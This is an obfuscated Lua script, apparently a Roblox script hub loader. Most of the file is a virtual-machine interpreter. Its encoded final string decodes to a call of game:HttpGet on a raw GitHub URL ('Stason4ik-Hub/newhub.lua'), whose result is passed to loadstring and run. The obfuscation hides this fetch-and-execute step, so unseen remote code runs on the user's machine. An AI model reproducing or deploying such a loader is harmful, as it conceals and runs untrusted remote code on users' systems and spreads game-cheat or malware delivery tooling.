local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 79) then
			v19 = v0(v3(v30, 1, 1));
			return "";
		else
			local v86 = v2(v0(v30, 16));
			if v19 then
				local v117 = v5(v86, v19);
				v19 = nil;
				return v117;
			else
				return v86;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v87 = 0 + 0;
			local v88;
			while true do
				if (v87 == (0 - 0)) then
					v88 = (v31 / ((5 - 3) ^ (v32 - 1))) % (((3 - 0) - 1) ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + (932 - (857 + 74))));
					return v88 - (v88 % 1);
				end
			end
		else
			local v89 = 568 - (367 + 201);
			local v90;
			while true do
				if (v89 == (927 - ((1279 - (68 + 997)) + 713))) then
					v90 = (1 + 1) ^ (v32 - (1 + 0));
					return (((v31 % (v90 + v90)) >= v90) and (878 - (282 + 595))) or (1637 - (1523 + 114));
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + (1272 - (226 + 1044)));
		v18 = v18 + 2;
		return (v36 * (1114 - 858)) + v35;
	end
	local function v23()
		local v37, v38, v39, v40 = v1(v16, v18, v18 + ((286 - 166) - (32 + 85)));
		v18 = v18 + 4 + 0;
		return (v40 * (3720433 + 13056783)) + (v39 * (66493 - ((1648 - 756) + 65))) + (v38 * 256) + v37;
	end
	local function v24()
		local v41 = (1913 - (1789 + 124)) - 0;
		local v42;
		local v43;
		local v44;
		local v45;
		local v46;
		local v47;
		while true do
			if (v41 == (353 - (87 + 263))) then
				if (v46 == (180 - (67 + 113))) then
					if (v45 == (0 - 0)) then
						return v47 * (0 + 0);
					else
						local v127 = 0 - 0;
						while true do
							if (v127 == (0 + 0)) then
								v46 = 3 - 2;
								v44 = (1423 - (630 + 793)) + 0;
								break;
							end
						end
					end
				elseif (v46 == (3621 - (2340 - (745 + 21)))) then
					return ((v45 == (952 - (802 + (508 - 358)))) and (v47 * ((2 - 1) / ((0 + 0) - 0)))) or (v47 * NaN);
				end
				return v8(v47, v46 - (745 + (764 - 486))) * (v44 + (v45 / ((999 - (915 + 82)) ^ (43 + (42 - 33)))));
			end
			if (v41 == (772 - (201 + 571))) then
				v42 = v23();
				v43 = v23();
				v41 = 2 - 1;
			end
			if (v41 == ((4 + 4) - 6)) then
				v46 = v20(v43, 13 + 8, 40 - 9);
				v47 = ((v20(v43, 1219 - (1069 + 118)) == (860 - (7 + 807 + 45))) and -(2 - 1)) or ((2 + 0) - 1);
				v41 = 1 + 2;
			end
			if (v41 == (1 - 0)) then
				v44 = 1 + 0;
				v45 = (v20(v43, 1, 35 - 15) * (((9 - 6) - (1056 - (87 + 968))) ^ ((140 - 108) + (1747 - (760 + 987))))) + v42;
				v41 = 793 - (368 + 423);
			end
		end
	end
	local function v25(v48)
		local v49;
		if not v48 then
			v48 = v23();
			if (v48 == (0 + 0)) then
				return "";
			end
		end
		v49 = v3(v16, v18, (v18 + v48) - (2 - 1));
		v18 = v18 + v48;
		local v50 = {};
		for v67 = 1414 - (447 + 966), #v49 do
			v50[v67] = v2(v1(v3(v49, v67, v67)));
		end
		return v6(v50);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v51 = (function()
			return function(v91, v92, v93, v94, v95, v96, v97, v98)
				local v91 = (function()
					return 1926 - (1235 + 691);
				end)();
				local v92 = (function()
					return;
				end)();
				local v94 = (function()
					return;
				end)();
				while true do
					if (v91 ~= (1835 - (274 + 1561))) then
					else
						local v122 = (function()
							return 0 - 0;
						end)();
						local v123 = (function()
							return;
						end)();
						while true do
							if ((0 + 0) ~= v122) then
							else
								v123 = (function()
									return 0;
								end)();
								while true do
									if (v123 == 0) then
										v92 = (function()
											return v93();
										end)();
										v94 = (function()
											return nil;
										end)();
										v123 = (function()
											return 1;
										end)();
									end
									if (1 == v123) then
										v91 = (function()
											return #"]";
										end)();
										break;
									end
								end
								break;
							end
						end
					end
					if (v91 ~= #"~") then
					else
						if (v92 == #"~") then
							v94 = (function()
								return v93() ~= 0;
							end)();
						elseif (v92 == 2) then
							v94 = (function()
								return v95();
							end)();
						elseif (v92 ~= #"19(") then
						else
							v94 = (function()
								return v96();
							end)();
						end
						v97[v98] = (function()
							return v94;
						end)();
						break;
					end
				end
				return v91, v92, v93, v94, v95, v96, v97, v98;
			end;
		end)();
		local v52 = (function()
			return function(v99, v100, v101, v102, v103, v104, v105, v106, v107)
				local v108 = (function()
					return 0;
				end)();
				local v99 = (function()
					return;
				end)();
				local v100 = (function()
					return;
				end)();
				while true do
					if (v108 == 1) then
						local v125 = (function()
							return 0;
						end)();
						while true do
							if (v125 ~= 0) then
							else
								local v128 = (function()
									return 241 - (187 + 54);
								end)();
								while true do
									if (v128 ~= (780 - (162 + 618))) then
									else
										while true do
											if (v99 ~= 0) then
											else
												v100 = (function()
													return v101();
												end)();
												if (v102(v100, #"/", #"}") == (0 + 0)) then
													local v170 = (function()
														return 0 + 0;
													end)();
													local v171 = (function()
														return;
													end)();
													local v172 = (function()
														return;
													end)();
													local v173 = (function()
														return;
													end)();
													while true do
														if (v170 ~= 2) then
														else
															if (v102(v172, #"[", #"}") == #".") then
																v173[3 - 1] = (function()
																	return v105[v173[2 - 0]];
																end)();
															end
															if (v102(v172, 1 + 1, 2) == #",") then
																v173[#"xnx"] = (function()
																	return v105[v173[#"gha"]];
																end)();
															end
															v170 = (function()
																return 3;
															end)();
														end
														if (v170 == (1639 - (1373 + 263))) then
															if (v102(v172, #"nil", #"xnx") == #":") then
																v173[#".com"] = (function()
																	return v105[v173[#".com"]];
																end)();
															end
															v106[v107] = (function()
																return v173;
															end)();
															break;
														end
														if (v170 ~= (1001 - (451 + 549))) then
														else
															local v175 = (function()
																return 0 + 0;
															end)();
															local v176 = (function()
																return;
															end)();
															while true do
																if (v175 == (0 - 0)) then
																	v176 = (function()
																		return 0 - 0;
																	end)();
																	while true do
																		if (v176 ~= (1384 - (746 + 638))) then
																		else
																			v173 = (function()
																				return {v103(),v103(),nil,nil};
																			end)();
																			if (v171 == (0 + 0)) then
																				local v181 = (function()
																					return 0 - 0;
																				end)();
																				local v182 = (function()
																					return;
																				end)();
																				while true do
																					if (0 == v181) then
																						v182 = (function()
																							return 341 - (218 + 123);
																						end)();
																						while true do
																							if (v182 ~= 0) then
																							else
																								v173[#"91("] = (function()
																									return v103();
																								end)();
																								v173[#"0836"] = (function()
																									return v103();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			elseif (v171 == #"/") then
																				v173[#"-19"] = (function()
																					return v104();
																				end)();
																			elseif (v171 == 2) then
																				v173[#"xnx"] = (function()
																					return v104() - ((1583 - (1535 + 46)) ^ (16 + 0));
																				end)();
																			elseif (v171 ~= #"91(") then
																			else
																				local v187 = (function()
																					return 0 + 0;
																				end)();
																				local v188 = (function()
																					return;
																				end)();
																				while true do
																					if (v187 == (560 - (306 + 254))) then
																						v188 = (function()
																							return 0 + 0;
																						end)();
																						while true do
																							if (v188 == (0 - 0)) then
																								v173[#"91("] = (function()
																									return v104() - ((1469 - (899 + 568)) ^ (11 + 5));
																								end)();
																								v173[#".dev"] = (function()
																									return v103();
																								end)();
																								break;
																							end
																						end
																						break;
																					end
																				end
																			end
																			v176 = (function()
																				return 1;
																			end)();
																		end
																		if (v176 == (2 - 1)) then
																			v170 = (function()
																				return 605 - (268 + 335);
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														if ((290 - (60 + 230)) ~= v170) then
														else
															local v177 = (function()
																return 572 - (426 + 146);
															end)();
															while true do
																if (1 ~= v177) then
																else
																	v170 = (function()
																		return 1 + 0;
																	end)();
																	break;
																end
																if (v177 ~= 0) then
																else
																	v171 = (function()
																		return v102(v100, 1458 - (282 + 1174), #"-19");
																	end)();
																	v172 = (function()
																		return v102(v100, #".com", 6);
																	end)();
																	v177 = (function()
																		return 812 - (569 + 242);
																	end)();
																end
															end
														end
													end
												end
												break;
											end
										end
										return v99, v100, v101, v102, v103, v104, v105, v106, v107;
									end
								end
							end
						end
					end
					if (v108 == (0 - 0)) then
						local v126 = (function()
							return 0 + 0;
						end)();
						while true do
							if (v126 ~= 0) then
							else
								v99 = (function()
									return 1024 - (706 + 318);
								end)();
								v100 = (function()
									return nil;
								end)();
								v126 = (function()
									return 1252 - (721 + 530);
								end)();
							end
							if ((1272 - (945 + 326)) == v126) then
								v108 = (function()
									return 2 - 1;
								end)();
								break;
							end
						end
					end
				end
			end;
		end)();
		local v53 = (function()
			return function(v109, v110, v111)
				local v112 = (function()
					return 0 + 0;
				end)();
				local v113 = (function()
					return;
				end)();
				while true do
					if (v112 ~= (700 - (271 + 429))) then
					else
						v113 = (function()
							return 0;
						end)();
						while true do
							if ((0 + 0) == v113) then
								local v129 = (function()
									return 1500 - (1408 + 92);
								end)();
								while true do
									if ((1086 - (461 + 625)) == v129) then
										v109[v110 - #"/"] = (function()
											return v111();
										end)();
										return v109, v110, v111;
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {v54,v55,nil,v56};
		end)();
		local v58 = (function()
			return v23();
		end)();
		local v59 = (function()
			return {};
		end)();
		for v69 = #"|", v58 do
			FlatIdent_1743D, Type, v21, Cons, v24, v25, v59, v69 = (function()
				return v51(FlatIdent_1743D, Type, v21, Cons, v24, v25, v59, v69);
			end)();
		end
		v57[#"gha"] = (function()
			return v21();
		end)();
		for v70 = #"[", v23() do
			FlatIdent_25011, Descriptor, v21, v20, v22, v23, v59, v54, v70 = (function()
				return v52(FlatIdent_25011, Descriptor, v21, v20, v22, v23, v59, v54, v70);
			end)();
		end
		for v71 = #"<", v23() do
			v55, v71, v28 = (function()
				return v53(v55, v71, v28);
			end)();
		end
		return v57;
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1 + 0];
		local v65 = v61[2];
		local v66 = v61[1174 - (418 + 753)];
		return function(...)
			local v72 = v64;
			local v73 = v65;
			local v74 = v66;
			local v75 = v27;
			local v76 = 1 + 0;
			local v77 = -1;
			local v78 = {};
			local v79 = {...};
			local v80 = v12("#", ...) - (1 + 0);
			local v81 = {};
			local v82 = {};
			for v114 = (0 - 0) + 0, v80 do
				if (v114 >= v74) then
					v78[v114 - v74] = v79[v114 + (4 - 3) + 0];
				else
					v82[v114] = v79[v114 + (530 - (406 + 123))];
				end
			end
			local v83 = (v80 - v74) + ((386 + 1384) - (1749 + 20));
			local v84;
			local v85;
			while true do
				v84 = v72[v76];
				v85 = v84[1 + 0];
				if (v85 <= 6) then
					if (v85 <= 2) then
						if ((v85 <= 0) or (1421 > 2104)) then
							do
								return;
							end
						elseif ((1812 <= 3249) and (v85 > (1323 - (1249 + 73)))) then
							v82[v84[1 + 1]]();
						else
							local v130 = v84[1147 - ((1443 - (553 + 424)) + 679)];
							local v131 = v82[v84[6 - (5 - 2)]];
							v82[v130 + (2 - 1)] = v131;
							v82[v130] = v131[v84[1904 - (31 + 75 + 912 + 882)]];
						end
					elseif (v85 <= (2 + 2 + 0)) then
						if ((1623 <= 1957) and (v85 > 3)) then
							local v135 = v84[2];
							v82[v135] = v82[v135](v13(v82, v135 + 1 + 0, v77));
						else
							local v137 = v84[(3 + 2) - (2 + 1)];
							local v138 = v82[v84[7 - 4]];
							v82[v137 + (115 - (4 + 110))] = v138;
							v82[v137] = v138[v84[588 - (57 + 527)]];
						end
					elseif ((4412 == 4412) and (v85 == (1432 - (41 + 1386)))) then
						v82[v84[105 - (17 + 86)]] = v84[3];
					else
						local v144 = v84[2 + 0];
						local v145, v146 = v75(v82[v144](v13(v82, v144 + (1 - 0), v84[8 - 5])));
						v77 = (v146 + v144) - (167 - (122 + 44));
						local v147 = (0 + 0) - 0;
						for v161 = v144, v77 do
							v147 = v147 + (3 - 2);
							v82[v161] = v145[v147];
						end
					end
				elseif ((1750 >= 842) and (v85 <= (8 + 1))) then
					if (v85 <= 7) then
						do
							return;
						end
					elseif ((4372 > 1850) and (v85 > (2 + 3 + 3))) then
						v82[v84[(7 - 4) - 1]]();
					else
						local v148 = v84[67 - (30 + 35)];
						local v149, v150 = v75(v82[v148](v13(v82, v148 + 1 + (0 - 0), v84[(2731 - 1471) - (1043 + 214)])));
						v77 = (v150 + v148) - (3 - 2);
						local v151 = 1212 - (323 + 889);
						for v164 = v148, v77 do
							local v165 = 0 - 0;
							while true do
								if (v165 == (580 - (361 + 219))) then
									v151 = v151 + ((894 - 573) - (53 + 267));
									v82[v164] = v149[v151];
									break;
								end
							end
						end
					end
				elseif (v85 <= (3 + (1559 - (1126 + 425)))) then
					if (v85 > ((124 + 299) - (15 + 398))) then
						v82[v84[984 - (18 + 964)]] = v63[v84[(53 - 42) - 8]];
					else
						v82[v84[2]] = v63[v84[2 + (754 - (239 + 514))]];
					end
				elseif (v85 == 12) then
					local v156 = 0 + 0;
					local v157;
					while true do
						if (v156 == 0) then
							v157 = v84[(1257 - (118 + 287)) - (20 + (3253 - 2423))];
							v82[v157] = v82[v157](v13(v82, v157 + 1 + 0, v77));
							break;
						end
					end
				else
					v82[v84[128 - ((1237 - (118 + 1003)) + 10)]] = v84[1 + 0 + (1331 - (797 + 532))];
				end
				v76 = v76 + (739 - (542 + (573 - 377)));
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F737461736F6E34696B37382F537461736F6E34696B2D4875622F6D61696E2F6E65776875622E6C756100083O00120A3O00013O00120A000100023O00200300010001000300120D000300044O0006000100034O000C5O00022O00023O000100012O00073O00017O00", v9(), ...);
